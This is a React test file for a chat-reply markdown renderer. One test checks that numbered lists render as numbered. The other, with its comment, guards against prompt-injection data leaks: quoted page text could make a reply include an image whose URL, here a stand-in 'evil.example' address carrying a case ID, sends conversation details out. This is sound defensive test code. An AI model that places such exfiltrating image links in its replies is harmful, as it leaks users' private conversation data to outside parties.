// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import { render, screen } from '@testing-library/react';
import { ChatMarkdown } from '../ChatMarkdown';

/**
 * A reply can quote a web page or a note. An image in it is shown as a link
 * and never loaded: loading one from any address would let quoted text send
 * the conversation's details to that address inside the image's URL
 * (Oct 12 2026).
 */
describe('ChatMarkdown', () => {
  it('shows an image as a link and never loads it', () => {
    const { container } = render(
      <ChatMarkdown content={'See ![the chart](https://evil.example/x.png?case=G-100-24339-516453)'} />
    );
    expect(container.querySelector('img')).toBeNull();
    const link = screen.getByRole('link', { name: 'Image: the chart' });
    expect(link).toHaveAttribute('href', 'https://evil.example/x.png?case=G-100-24339-516453');
    expect(link).toHaveAttribute('rel', expect.stringContaining('noreferrer'));
  });

  // react-markdown 10 stopped telling a list item whether its list is
  // numbered, so numbered steps came out as bullets.
  it('numbers a numbered list', () => {
    const { container } = render(<ChatMarkdown content={'1. File the PWD\n2. Start recruitment'} />);
    const ol = container.querySelector('ol');
    expect(ol).not.toBeNull();
    expect(ol!.className).toMatch(/list-decimal/);
    expect(container.querySelectorAll('ol > li')).toHaveLength(2);
  });
});
